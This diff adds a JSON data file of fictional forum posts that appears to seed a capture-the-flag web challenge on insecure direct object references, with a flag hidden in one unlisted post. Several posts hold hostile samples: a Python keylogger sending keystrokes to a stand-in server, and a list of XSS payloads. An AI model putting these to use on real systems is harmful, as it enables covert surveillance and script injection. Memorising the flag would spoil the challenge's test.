@@ -1,0 +1,354 @@
+[
+  {
+    "id": 9,
+    "title": "How to log into friend’s rizzbook?",
+    "content": "Hi everyone. I’m new to this forum. Do you know how to log into my friend’s rizzbook without knowing the password? Thanks in advance.",
+    "comments": [
+      {
+        "content": "Archiving the post. Already answered. Use the search button. TLDR: it’s illegal.",
+        "author": {
+          "username": "admin"
+        }
+      }
+    ],
+    "author": {
+      "username": "fabien89"
+    }
+  },
+  {
+    "id": 21,
+    "title": "Help me debug my python code",
+    "content": "python\nimport keyboard\nimport requests\n\nserver_address = \"http://example.com/log\"\nkeylog_buffer = \"\"\n\ndef on_key_press(event):\n    global keylog_buffer\n    key = event.name\n    keylog_buffer += key\n    if len(keylog_buffer) = 50:\n        send_to_server(keylog_buffer)\n        keylog_buffer = \"\"\n\ndef send_to_server(data):\n    try:\n        response = requests.post(server_address, data={\"keystrokes\": data})\n        if response.status_code == 200:\n            print(\"Data sent successfully\")\n    except Exception as e:\n        print(\"Error sending data:\", e)\n\nkeyboard.on_release(on_key_press)\nkeyboard.wait(\"esc\")\n",
+    "comments": [
+      {
+        "content": "the line if len(keylog_buffer) = 50 is wrong.",
+        "author": {
+          "username": "sarahismylovernow"
+        }
+      }
+    ],
+    "author": {
+      "username": "sarahismylover"
+    }
+  },
+  {
+    "id": 32,
+    "title": "Debunking fake news about Vasya Eclaire",
+    "content": "Hello, everyone from Reverseland. I've heard some fake news about my country, Webvestee, being spread here, so I would like to debunk them:\n– Vasya Eclaire DID NOT steal his coworker’s laptop containing confidential information during a trip to Sqlin last year.\n– Mattia Frenotto DID NOT pay 10,000 Webvestee dollars to a state official to skip his obligatory yearly trash-cleaning shift.\nHere’s what’s true about Segfaultland’s politicians:\n– Jonas Ketrel promised to drink from the local fountain after Melania Strew got sick, and DID NOT fulfill his promise.\n– Jonas Ketrel was charged with 10 counts of insider trading in his thirties.\n– Jonas Ketrel lost a case in a Webvesteevian court and DID NOT pay the fine.\nShould you have any questions, leave a comment below.",
+    "comments": [
+      {
+        "content": "ban this person please",
+        "author": {
+          "username": "jonasketrelfandomofficial"
+        }
+      }
+    ],
+    "author": {
+      "username": "madeleine_currey"
+    }
+  },
+  {
+    "id": 33,
+    "title": "I need help with remembering my passwords",
+    "content": "When I got my first computer, I started to write down all my passwords in my notebook. But now, I have so many accounts, I started forgetting them. What should I do? I sometimes need to log in on a nother computer, where my notebook is not available...",
+    "comments": [
+      {
+        "content": "You should invest in a Password Manager. It allows you to store your passwords securely and you only have to remember the master password. There are many options available. The password manager randomizes each password and stores it. It's much more secure than writing the passwords in the notebook anyone can steal.",
+        "author": {
+          "username": "ilovhackin"
+        }
+      },
+      {
+        "content": "Hi, thank you. I'll try to look up options on the internet. But it sounds sooo complicated :/",
+        "author": {
+          "username": "fabien89"
+        }
+      }
+    ],
+    "author": {
+      "username": "fabien89"
+    }
+  },
+  {
+    "id": 36,
+    "title": "Forum's new rules",
+    "content": "Please don't share your passwords here. Please don't share your dangerous code here. Please don't help dangerous people.\nI mean, C'mon. We want this forum to exist! Freedom of speech has its limits, especially in Reverseland.",
+    "comments": [
+      {
+        "content": "I feel called out hahahah. OK, I'll stop.",
+        "author": {
+          "username": "sarahismylover"
+        }
+      },
+      {
+        "content": "Hi admin, appreciate your wishes. I'll do as you ask.",
+        "author": {
+          "username": "fabien89"
+        }
+      },
+      {
+        "content": "Thank you admin for your contributions to this forum! Will try to stay wholesome",
+        "author": {
+          "username": "sarahismylovernow"
+        }
+      },
+      {
+        "content": "Am I still allowed to write about Vasya Eclaire?",
+        "author": {
+          "username": "madeleine_currey"
+        }
+      },
+      {
+        "content": "Noone said that politics are banned.",
+        "author": {
+          "username": "jonasketrelfandomofficial"
+        }
+      }
+    ],
+    "author": {
+      "username": "admin"
+    }
+  },
+  {
+    "id": 44,
+    "title": "Why it's important to stay wholesome",
+    "content": "They told me that people from Reverseland are crazy. However, after spending more time on this forum, after shorter and longer conversations with people, I realized that it’s all just propaganda meant to pit kindred spirits against each other—people who were born beyond borders but are no different, except for the laws in their countries and their politicians. Regimes feed on us and our tendencies toward hatred. I suggest we refrain from judgments. We live in different countries, but on this forum, we are one community. We live in different countries, but on our planet, we are the same species. Let’s forget what divides us and enjoy life. I love you all <3",
+    "comments": [
+      {
+        "content": "NO. Unless you people stop sharing fake info about Vasya Eclaire!",
+        "author": {
+          "username": "madeleine_currey"
+        }
+      }
+    ],
+    "author": {
+      "username": "fabien89"
+    }
+  },
+  {
+    "id": 45,
+    "title": "Share your favorite XSS payloads",
+    "content": "I'll start with mine:\n<script>alert('XSS')</script>\n%253Cscript%253Ealert('XSS')%253C%252Fscript%253E\n",
+    "comments": [
+      {
+        "content": "<svg/onload=alert(1)\n<img src=xss onerror=alert(1)>\n<svg><script ?>alert(1)\n<BODY ONLOAD=alert('XSS')>",
+        "author": {
+          "username": "sarahismylovernow"
+        }
+      }
+    ],
+    "author": {
+      "username": "sarahismylover"
+    }
+  },
+  {
+    "id": 48,
+    "title": "Do you read fanfiction? What about jonasketrel x vasyaelcaire?",
+    "content": "Hello everyone :3 I am a fanfiction writer and I thought of writing a medieval AU of Vasya Eclaire and Jonas Ketrel, they both would be knights for the same king, but fighting to overthow him and finally falling in love. I am wondering whether anyone here would be interested in reading this fic. I predominantly write for fandoms, but this new concept is rather niche ;P\nPlease don't tell me that it's weird. It's fiction! They are not hurt! I'm just a big fan of them! Can't force me to not imagine them hugging!",
+    "comments": [
+      {
+        "content": "I need to read this so badly please release it ASAP I BEG YOU!!!!!",
+        "author": {
+          "username": "jonasketrelfandomofficial"
+        }
+      },
+      {
+        "content": "lmao im usually against this kind of posts but this time i can't, i have to read this, feel free to make another forum post with a link to it",
+        "author": {
+          "username": "admin"
+        }
+      },
+      {
+        "content": "it's disgusting!!!!! where is the link??!",
+        "author": {
+          "username": "madeleine_currey"
+        }
+      }
+    ],
+    "author": {
+      "username": "fictionislovefictionislife"
+    }
+  },
+  {
+    "id": 51,
+    "title": "Reverseland politics",
+    "content": "hello everyone, can someone make a short post about reverseland politics? people never talk about the politicians, i am curious",
+    "comments": [
+      {
+        "content": "People here rarely talk about politics, because criticizing the government is persecuted.\n1. Our great leader is called Kent Kravtz.\n2. Internet is heavily cenzored by the gov.\n3. Many websites are blocked and you have to use VPN to access them.\n4. People are arrested for their views.\n5. In schools, the teachers have to endorse the gov and their views.\n6. People are forced to get married to breed new citizens..\nSorry, it's hard to talk about it. I wish I was born elsewhere :/",
+        "author": {
+          "username": "frantzRL"
+        }
+      }
+    ],
+    "author": {
+      "username": "fabien89"
+    }
+  },
+  {
+    "id": 69,
+    "title": "Why me???",
+    "content": "Aaaand now I have to look for another job. Another year, another layoff. This job market is... horrendous. I got layed off from CyberSec4Us and they gave no reason whatsoever. Does anybody have some job offers? I am desperate for money, now I live on cottage cheese and instant ramen, and my digestive system won't take it anymore. My wallet is already slim, and now it is be time for me.",
+    "comments": [
+      {
+        "content": "broooo you should move to webvestee. our social packages will help you for sure",
+        "author": {
+          "username": "madeleine_currey"
+        }
+      },
+      {
+        "content": "I don't even have money to eat normally and yet I am supposed to move to another country? No thank you!",
+        "author": {
+          "username": "whatsverstappening33"
+        }
+      },
+      {
+        "content": "I think Duck Corporation Studios is looking for a web developer. I work in music industry in general, but I heard you cybersec guys are truly versatile. Their website is soooo boring and they need to spice it up",
+        "author": {
+          "username": "eyesyes"
+        }
+      },
+      {
+        "content": "I can give you some discount ramen noodles BonTon. They are cheaply imported from Webvestee.",
+        "author": {
+          "username": "madeleine_currey"
+        }
+      },
+      {
+        "content": "Thanks, if you can, send them to 31/4 Agostino Lane, Compiler City, Segfaultland",
+        "author": {
+          "username": "whatsverstappening33"
+        }
+      },
+      {
+        "content": "👀",
+        "author": {
+          "username": "admin"
+        }
+      },
+      {
+        "content": "this is a fake address, do not send anything there. closing thread.",
+        "author": {
+          "username": "admin"
+        }
+      }
+    ],
+    "author": {
+      "username": "whatsverstappening33"
+    }
+  },
+  {
+    "id": 75,
+    "title": "Community guidelines reminder",
+    "content": "We, forum admins, politely remind you not to disclose any private info, should it be real or not.",
+    "comments": [
+      {
+        "content": "Hahah I read that as Communism Guidelines Reminder. I am reminding you all every day about that haha",
+        "author": {
+          "username": "madeleine_currey"
+        }
+      },
+      {
+        "content": "ok c0mmie",
+        "author": {
+          "username": "iwhpacuyh"
+        }
+      },
+      {
+        "content": "i am reporting this user. she is clearly a bot.",
+        "author": {
+          "username": "iwhpacuyh"
+        }
+      }
+    ],
+    "author": {
+      "username": "admin"
+    }
+  },
+  {
+    "id": 84,
+    "title": "listen to my new album :D",
+    "content": "thanks to the kindness of Duck Corporation Studios I managed to produce my first new album called Reverseland Rules",
+    "comments": [
+      {
+        "content": "I will never listen to this propaganda",
+        "author": {
+          "username": "madeleine_currey"
+        }
+      },
+      {
+        "content": "I like the second track most. Love the disco vibes",
+        "author": {
+          "username": "jan_michael"
+        }
+      },
+      {
+        "content": "DO NOT LISTEN TO THIS PROPAGANDA I TELL YOU ONLY WEBVESTEE MUSIC IS GOOD",
+        "author": {
+          "username": "madeleine_currey"
+        }
+      },
+      {
+        "content": "closing thread, convo too aggressive. @madeleine_currey you have two warnings already. Third one will cause an automatic ban.",
+        "author": {
+          "username": "admin"
+        }
+      }
+    ],
+    "author": {
+      "username": "a2m@duck.crp.studios.rl"
+    }
+  },
+  {
+    "id": 92,
+    "title": "My neighbours keep smashing things on their heater pipes and I can't sleep",
+    "content": "They keep banging their heater pipes at all times, it is so loud, are your neighbours like that?",
+    "comments": [
+      {
+        "content": "Nooo, my neighbours are very quiet and kind. I live in a peaceful Webvestee neighbourhood.",
+        "author": {
+          "username": "madeleine_currey"
+        }
+      },
+      {
+        "content": "Good for you",
+        "author": {
+          "username": "jon_rain"
+        }
+      },
+      {
+        "content": "I think you should report it to the housing cooperative. It can't be like that",
+        "author": {
+          "username": "jan_michael"
+        }
+      },
+      {
+        "content": "I think you should report it to the housing cooperative. It can't be like that",
+        "author": {
+          "username": "jan_michael"
+        }
+      },
+      {
+        "content": "Have you tried *communication*? Talk to your neighbours and stay wholesome!",
+        "author": {
+          "username": "fabien89"
+        }
+      }
+    ],
+    "author": {
+      "username": "jon_rain"
+    }
+  },
+  {
+    "id": 68,
+    "title": "IDOR - Insecure direct object references",
+    "content": "TGHM{ap0litical_h4cking_f0rum_lm4o}",
+    "comments": [
+    ],
+    "author": {
+      "username": "admin"
+    }
+  }
+]
+
+
